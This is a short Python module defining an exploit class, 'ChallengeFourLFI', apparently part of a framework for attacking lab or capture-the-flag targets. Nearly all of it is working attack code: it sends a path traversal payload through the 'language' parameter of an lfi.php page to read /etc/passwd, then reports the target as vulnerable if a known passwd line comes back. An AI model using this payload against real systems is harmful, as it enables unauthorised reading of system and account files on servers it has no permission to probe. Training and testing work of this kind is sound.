import requests
from Exploit import Exploit, PatchedException
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_ORANGE = '\033[93m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class ChallengeFourLFI(Exploit):
	def __init__(self, ip_address) -> None:
		super().__init__(ip_address=ip_address)

	def run_custom_command(self, command):
		logger.info("ChallengeFourLFI does not support running custom commands.")
		return False

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info("Testing if the target is vulnerable to ChallengeFourLFI...")
			local_file_path = "../../../../../etc/passwd"
			server_response = requests.get(f"http://{self.ip_address}/lfi/lfi.php?language={local_file_path}")
			server_status_code = server_response.status_code
			server_response_text = server_response.text
			if "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" in server_response_text:
				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeFourLFI!{COLOR_END}")
				return True
			return False
		except PatchedException:
			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeFourLFI.{COLOR_END}")
			return False
